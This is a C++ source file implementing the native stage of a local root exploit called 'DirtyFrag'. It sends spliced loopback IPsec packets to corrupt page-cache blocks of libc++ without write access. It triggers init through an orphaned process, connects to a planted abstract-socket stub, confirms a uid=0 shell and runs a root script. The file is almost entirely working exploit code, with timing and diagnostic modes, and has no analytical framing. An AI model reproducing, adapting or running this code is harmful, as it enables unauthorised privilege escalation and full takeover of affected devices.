/*
 * Second way (DirtyFrag hybrid), native half.
 *
 * The app owns the IpSec transform and every cryptographic detail: it reads the
 * current 16-byte blocks of libc++, computes IV = AES_ECB_DEC(key, old) XOR
 * desired, and writes them to the control file. This unit only
 *   - sends each patch/restore packet (SPI|Seq|IV + the file page, spliced),
 *   - triggers init by orphaning a child,
 *   - connects to the stub's abstract socket and runs the root script.
 *
 * No kernel state is written here; no AES is needed.
 */

#include "session/dirtyfrag_stage.hpp"
#include "session/runtime_config.h"

#include <cerrno>
#include <chrono>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <fcntl.h>
#include <netinet/in.h>
#include <poll.h>
#include <arpa/inet.h>
#include <string>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>
#include <vector>

namespace ghostlock::session {
    namespace {
        struct dirty_entry final {
            off_t offset;
            uint8_t iv[16];
        };

        struct dirty_plan final {
            std::string lib;
            std::string socket_name;
            int32_t sender_port = 0;
            int32_t encap_port = 0;
            uint32_t spi = 0;
            std::vector<dirty_entry> patch;
            std::vector<dirty_entry> restore;
        };

        bool parse_hex16(const char *text, uint8_t out[16]) {
            if (std::strlen(text) != 32) return false;
            for (std::size_t i = 0; i < 16; i++) {
                const std::size_t index = i * 2;
                char byte[3] = {text[index], text[index + 1], '\0'};
                char *end = nullptr;
                const unsigned long value = std::strtoul(byte, &end, 16);
                if (end != byte + 2) return false;
                out[i] = static_cast<uint8_t>(value);
            }
            return true;
        }

        bool load_plan(const char *path, dirty_plan *plan) {
            FILE *file = std::fopen(path, "re");
            if (file == nullptr) {
                std::fprintf(stderr, "dirtyfrag: cannot open control file %s errno=%d\n", path, errno);
                return false;
            }
            char line[512];
            while (std::fgets(line, sizeof(line), file) != nullptr) {
                char *save = nullptr;
                const char *key = strtok_r(line, " \t\r\n", &save);
                if (key == nullptr) continue;
                if (std::strcmp(key, "lib") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->lib = value;
                } else if (std::strcmp(key, "sender") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->sender_port = std::atoi(value);
                } else if (std::strcmp(key, "encap") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->encap_port = std::atoi(value);
                } else if (std::strcmp(key, "spi") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->spi = static_cast<uint32_t>(std::strtoul(value, nullptr, 10));
                } else if (std::strcmp(key, "socket") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->socket_name = value;
                } else if (std::strcmp(key, "patch") == 0 || std::strcmp(key, "restore") == 0) {
                    const char *off = strtok_r(nullptr, " \t\r\n", &save);
                    const char *iv = strtok_r(nullptr, " \t\r\n", &save);
                    dirty_entry entry{};
                    if (off == nullptr || iv == nullptr ||
                        !parse_hex16(iv, entry.iv)) {
                        std::fprintf(stderr, "dirtyfrag: bad %s entry\n", key);
                        std::fclose(file);
                        return false;
                    }
                    entry.offset = static_cast<off_t>(std::strtoll(off, nullptr, 10));
                    (std::strcmp(key, "patch") == 0 ? plan->patch : plan->restore).push_back(entry);
                }
            }
            std::fclose(file);
            if (plan->lib.empty() || plan->socket_name.empty() ||
                plan->sender_port <= 0 || plan->encap_port <= 0) {
                std::fprintf(stderr, "dirtyfrag: incomplete control file\n");
                return false;
            }
            return true;
        }

        int send_one(int socket_fd, int file_fd, const dirty_entry &entry, uint32_t spi,
                     uint32_t sequence) {
            uint8_t header[24];
            const uint32_t spi_be = htonl(spi);
            const uint32_t seq_be = htonl(sequence);
            std::memcpy(header, &spi_be, 4);
            std::memcpy(header + 4, &seq_be, 4);
            std::memcpy(header + 8, entry.iv, 16);

            int pipe_fds[2];
            if (pipe(pipe_fds) < 0) return -errno;
            struct iovec iov{};
            iov.iov_base = header;
            iov.iov_len = sizeof(header);
            if (vmsplice(pipe_fds[1], &iov, 1, SPLICE_F_GIFT) != 24) {
                const int err = -errno;
                close(pipe_fds[0]);
                close(pipe_fds[1]);
                return err;
            }
            loff_t offset = entry.offset;
            if (splice(file_fd, &offset, pipe_fds[1], nullptr, 16, SPLICE_F_MOVE) != 16) {
                const int err = -errno;
                close(pipe_fds[0]);
                close(pipe_fds[1]);
                return err;
            }
            const ssize_t sent = splice(pipe_fds[0], nullptr, socket_fd, nullptr, 40, 0);
            const int result = (sent == 40) ? 0 : (sent < 0 ? -errno : -1000);
            close(pipe_fds[0]);
            close(pipe_fds[1]);
            return result;
        }

        int open_sender(const dirty_plan &plan) {
            const int fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) return -1;
            int one = 1;
            setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
            struct sockaddr_in source{};
            source.sin_family = AF_INET;
            source.sin_port = htons(static_cast<uint16_t>(plan.sender_port));
            source.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (bind(fd, reinterpret_cast<struct sockaddr *>(&source), sizeof(source)) < 0) {
                close(fd);
                return -1;
            }
            struct sockaddr_in target{};
            target.sin_family = AF_INET;
            target.sin_port = htons(static_cast<uint16_t>(plan.encap_port));
            target.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (connect(fd, reinterpret_cast<struct sockaddr *>(&target), sizeof(target)) < 0) {
                close(fd);
                return -1;
            }
            return fd;
        }

        void trigger_orphan(void) {
            const pid_t pid = fork();
            if (pid == 0) {
                const pid_t grandchild = fork();
                if (grandchild == 0) {
                    sleep(1);
                    _exit(0);
                }
                _exit(0);
            }
            if (pid > 0) {
                int32_t status = 0;
                waitpid(pid, &status, 0);
            }
        }

        int connect_socket(const std::string &name, int32_t timeout_ms) {
            for (int32_t waited = 0; waited < timeout_ms; waited += 50) {
                const int fd = socket(AF_UNIX, SOCK_STREAM, 0);
                if (fd < 0) return -1;
                struct sockaddr_un address{};
                address.sun_family = AF_UNIX;
                address.sun_path[0] = '\0';
                std::size_t length = name.size();
                if (length > sizeof(address.sun_path) - 1) length = sizeof(address.sun_path) - 1;
                std::memcpy(address.sun_path + 1, name.data(), length);
                const socklen_t address_length = static_cast<socklen_t>(
                    offsetof(struct sockaddr_un, sun_path) + 1 + length);
                if (connect(fd, reinterpret_cast<struct sockaddr *>(&address), address_length) == 0) {
                    return fd;
                }
                close(fd);
                usleep(50 * 1000);
            }
            return -1;
        }

        std::string read_until(int fd, int32_t timeout_ms, const char *stop) {
            std::string out;
            const auto deadline = std::chrono::steady_clock::now() + std::chrono::milliseconds(timeout_ms);
            char buffer[512];
            while (std::chrono::steady_clock::now() < deadline) {
                struct pollfd pfd{};
                pfd.fd = fd;
                pfd.events = POLLIN;
                const int ready = poll(&pfd, 1, 200);
                if (ready <= 0) continue;
                const ssize_t count = read(fd, buffer, sizeof(buffer));
                if (count <= 0) break;
                out.append(buffer, static_cast<std::size_t>(count));
                if (stop != nullptr && out.find(stop) != std::string::npos) break;
            }
            return out;
        }

        void print_log_tail(const std::string &path) {
            const int fd = open(path.c_str(), O_RDONLY);
            if (fd < 0) {
                std::printf("dirtyfrag: ksu-log absent path=%s\n", path.c_str());
                return;
            }
            const off_t size = lseek(fd, 0, SEEK_END);
            const off_t start = size > 4096 ? size - 4096 : 0;
            if (lseek(fd, start, SEEK_SET) >= 0) {
                std::string tail;
                char buffer[512];
                ssize_t count;
                while ((count = read(fd, buffer, sizeof(buffer))) > 0) {
                    tail.append(buffer, static_cast<std::size_t>(count));
                }
                std::printf("dirtyfrag: ksu-log=%s\n%s", path.c_str(), tail.c_str());
            }
            close(fd);
        }
    } // namespace

    int run_dirtyfrag_stage(const char *control_path, const char *mode) {
        /* The stage is a second native invocation; the exploit session's
         * `[T+ms]` clock does not exist here. A local clock from the function
         * start makes the stage measurable without the app's wall. */
        const auto stage_t0 = std::chrono::steady_clock::now();
        const auto stage_ms = [&stage_t0]() {
            return std::chrono::duration_cast<std::chrono::milliseconds>(
                       std::chrono::steady_clock::now() - stage_t0)
                .count();
        };
        dirty_plan plan{};
        if (!load_plan(control_path, &plan)) return 1;
        const bool no_shell = (mode != nullptr && std::strcmp(mode, "noshell") == 0);
        const bool no_script = (mode != nullptr && std::strcmp(mode, "noscript") == 0);
        /* Diagnostic A/B arm: the old behaviour (restore after the root
         * script) instead of the product's early restore. */
        const bool late_restore = (mode != nullptr && std::strcmp(mode, "laterestore") == 0);
        std::printf("dirtyfrag: T+%lldms plan lib=%s patch=%zu restore=%zu socket=@%s mode=%s\n",
                    static_cast<long long>(stage_ms()), plan.lib.c_str(), plan.patch.size(),
                    plan.restore.size(), plan.socket_name.c_str(),
                    mode != nullptr ? mode : "full");

        const int file_fd = open(plan.lib.c_str(), O_RDONLY);
        if (file_fd < 0) {
            std::fprintf(stderr, "dirtyfrag: cannot open %s errno=%d\n", plan.lib.c_str(), errno);
            return 1;
        }
        const int sender = open_sender(plan);
        if (sender < 0) {
            std::fprintf(stderr, "dirtyfrag: sender socket failed errno=%d\n", errno);
            close(file_fd);
            return 1;
        }

        uint32_t sequence = 1;
        bool ok = true;
        for (const dirty_entry &entry : plan.patch) {
            const int result = send_one(sender, file_fd, entry, plan.spi, sequence++);
            if (result != 0) {
                std::fprintf(stderr, "dirtyfrag: patch offset=%lld failed %d\n",
                             static_cast<long long>(entry.offset), result);
                ok = false;
                break;
            }
        }
        if (ok) std::printf("dirtyfrag: T+%lldms patched %zu blocks\n", static_cast<long long>(stage_ms()), plan.patch.size());

        const auto dump_block = [&](const char *label, const dirty_entry &entry) {
            uint8_t block[16];
            if (pread(file_fd, block, sizeof(block), entry.offset) == 16) {
                std::printf("dirtyfrag: readback %s base=%lld bytes=%02x%02x%02x%02x%02x%02x%02x%02x"
                            "%02x%02x%02x%02x%02x%02x%02x%02x\n",
                            label, static_cast<long long>(entry.offset),
                            block[0], block[1], block[2], block[3], block[4], block[5],
                            block[6], block[7], block[8], block[9], block[10], block[11],
                            block[12], block[13], block[14], block[15]);
            }
        };
        /* Read back the page cache through the same file: the ESP write is the
         * only writer, so these bytes prove whether the patch landed. */
        if (ok && !plan.patch.empty()) {
            dump_block("cave-first", plan.patch.front());
            dump_block("hook-last", plan.patch.back());
        }

        /* The stub is one-shot: once the shell is connected no new process
         * needs the patched pages. Restore here, before the root script, so
         * the init-hook/page-cache window is only the patch + connect
         * interval. It also runs when the shell failed, so a failed trigger
         * does not leave libc++ patched. */
        bool restored = false;
        const auto restore_blocks = [&]() {
            bool restore_ok = true;
            for (const dirty_entry &entry : plan.restore) {
                const int result = send_one(sender, file_fd, entry, plan.spi, sequence++);
                if (result != 0) {
                    std::fprintf(stderr, "dirtyfrag: restore offset=%lld failed %d\n",
                                 static_cast<long long>(entry.offset), result);
                    restore_ok = false;
                }
            }
            std::printf("dirtyfrag: T+%lldms restored %zu blocks ok=%d\n", static_cast<long long>(stage_ms()), plan.restore.size(), restore_ok ? 1 : 0);
            if (!plan.restore.empty()) {
                dump_block("restore-first", plan.restore.front());
                dump_block("restore-last", plan.restore.back());
            }
            restored = true;
            return restore_ok;
        };

        if (ok && no_shell) {
            ok = restore_blocks() && ok;
            close(sender);
            close(file_fd);
            std::printf("dirtyfrag: T+%lldms RESULT=%s (noshell)\n", static_cast<long long>(stage_ms()), ok ? "OK" : "FAIL");
            return ok ? 0 : 1;
        }

        int shell = -1;
        if (ok) {
            trigger_orphan();
            shell = connect_socket(plan.socket_name, 5000);
            if (shell < 0) {
                std::fprintf(stderr, "dirtyfrag: no shell (connect failed)\n");
                ok = false;
            }
        }

        bool shell_uid0 = false;
        if (shell >= 0) {
            const char *id_command = "id\n";
            if (write(shell, id_command, std::strlen(id_command)) < 0) ok = false;
            const std::string id_reply = read_until(shell, 2000, "\n");
            std::printf("dirtyfrag: T+%lldms shell=%s\n", static_cast<long long>(stage_ms()), id_reply.c_str());
            if (id_reply.find("uid=0") == std::string::npos) {
                std::fprintf(stderr, "dirtyfrag: shell is not uid=0\n");
                ok = false;
            } else {
                shell_uid0 = true;
            }
        }

        if (!restored && !late_restore) ok = restore_blocks() && ok;

        if (ok && !no_script && shell_uid0) {
            const std::string script = config::runtime_config_snapshot().root_script_path;
            const std::string command = "sh '" + script + "'; echo DFRC=$?\n";
            if (write(shell, command.data(), command.size()) < 0) ok = false;
            const std::string output = read_until(shell, 30000, "DFRC=");
            std::printf("dirtyfrag: T+%lldms script-output=%s\n", static_cast<long long>(stage_ms()), output.c_str());
            if (output.find("DFRC=") == std::string::npos) {
                std::fprintf(stderr, "dirtyfrag: root script did not finish\n");
                ok = false;
            }
        }

        if (!restored) ok = restore_blocks() && ok;

        if (shell >= 0) close(shell);
        if (ok && !no_script) print_log_tail(config::runtime_config_snapshot().ksu_log_path);
        close(sender);
        close(file_fd);
        std::printf("dirtyfrag: T+%lldms RESULT=%s%s\n", static_cast<long long>(stage_ms()), ok ? "OK" : "FAIL", no_script ? " (noscript)" : "");
        return ok ? 0 : 1;
    }
} // namespace ghostlock::session
